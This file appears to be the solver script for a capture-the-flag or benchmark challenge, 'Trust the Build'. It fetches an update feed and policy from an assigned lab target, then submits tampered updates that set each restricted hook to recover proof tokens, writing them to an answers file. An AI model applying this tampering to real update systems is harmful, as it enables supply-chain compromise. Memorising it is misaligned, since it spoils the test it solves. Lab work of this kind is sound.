#!/usr/bin/env python3
"""Recover Trust the Build proofs from the current untimed assignment.

Usage: python3 solve.py [single_solve|time_trial]
Reads only the mode's start.json and talks only to its assigned target origins.
"""
import copy
import http.cookiejar
import json
from pathlib import Path
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")


class Target:
    def __init__(self, base_url, evidence_dir):
        self.base = base_url.rstrip("/")
        parsed = urllib.parse.urlsplit(self.base)
        self.origin = (parsed.scheme, parsed.netloc)
        self.evidence_dir = evidence_dir
        self.evidence_dir.mkdir(parents=True, exist_ok=True)
        self.requests = 0
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar))

    def request(self, route, method="GET", payload=None, save="response"):
        url = urllib.parse.urljoin(self.base + "/", route.lstrip("/"))
        parsed = urllib.parse.urlsplit(url)
        if (parsed.scheme, parsed.netloc) != self.origin:
            raise ValueError("refusing an out-of-scope target URL")
        if self.requests:
            time.sleep(0.8)
        self.requests += 1
        data = json.dumps(payload).encode() if payload is not None else None
        headers = {"User-Agent": UA}
        if payload is not None:
            headers["Content-Type"] = "application/json"
        request = urllib.request.Request(url, data=data, headers=headers, method=method)
        try:
            with self.opener.open(request, timeout=30) as response:
                status = response.status
                body = response.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as error:
            status = error.code
            body = error.read().decode("utf-8", "replace")
        (self.evidence_dir / f"{save}.meta.json").write_text(
            json.dumps({"method": method, "url": url, "status": status}, indent=2))
        (self.evidence_dir / f"{save}.body").write_text(body)
        return status, body

    def get_json(self, route, save):
        status, body = self.request(route, save=save)
        return status, json.loads(body) if status == 200 else None

    def post_json(self, route, payload, save):
        status, body = self.request(route, "POST", payload, save)
        return status, json.loads(body) if body else None


def recover_update_proof(target):
    target.request("/", save="root")
    status, clues = target.get_json("/api/clues", "clues")
    if status != 200:
        return None
    status, feed = target.get_json(clues["update_feed"], "update-feed")
    if status != 200:
        return None
    status, policy = target.get_json(clues["update_policy"], "update-policy")
    if status != 200:
        return None
    restricted = [hook["name"] for hook in policy.get("hooks", [])
                  if hook.get("access") == "restricted"]
    for number, original in enumerate(feed.get("updates", [])):
        update = copy.deepcopy(original)
        for hook in restricted:
            update["artifact"]["hook"] = hook
            status, response = target.post_json(
                clues["feature_route"], update, f"tampered-update-{number}-{hook}")
            match = PROOF_RE.search(json.dumps(response))
            if match:
                return match.group(0)
    return None


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "single_solve"
    mode_dir = Path(__file__).resolve().parent / mode
    start = json.loads((mode_dir / "start.json").read_text())
    targets = {item["id"]: item["url"] for item in start["targets"]}
    answers = {}
    for question in start["questions"]:
        target = Target(targets[question["artifact"]], mode_dir / "solver-evidence")
        proof = recover_update_proof(target)
        if not proof:
            raise SystemExit(f"no proof recovered for {question['id']}")
        answers[question["id"]] = proof
    (mode_dir / "answers.json").write_text(json.dumps(answers, indent=2) + "\n")
    print(json.dumps(answers, indent=2))


if __name__ == "__main__":
    main()
